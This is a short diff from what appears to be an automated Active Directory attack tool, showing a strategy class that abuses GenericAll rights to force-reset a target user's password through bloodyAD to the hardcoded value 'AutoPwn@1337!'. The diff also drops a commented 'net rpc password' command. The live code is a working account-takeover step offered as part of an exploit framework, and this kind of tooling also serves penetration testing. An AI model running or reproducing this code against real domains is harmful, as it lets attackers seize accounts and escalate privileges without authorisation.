@@ -66,13 +66,9 @@ class GenericAllStrategy(ExploitStrategy):
     def _force_change_password_hash(self, creds: dict) -> ExploitResult: # GENERICALL
         target_sam  = _sam(self.target.label)
         new_password = "AutoPwn@1337!"
-		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
         ok, output = run_tool(_bloodyad(creds, [
     		"set", "password", target_sam, new_password
 		]))
-        # ok, output = run_tool(_bloodyad(creds, [
-    	# 	"set", "password", target_sam, new_password
-		# ]))
         if not ok:
             raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
         print_done(f"Password changed for {target_sam} → {new_password}")
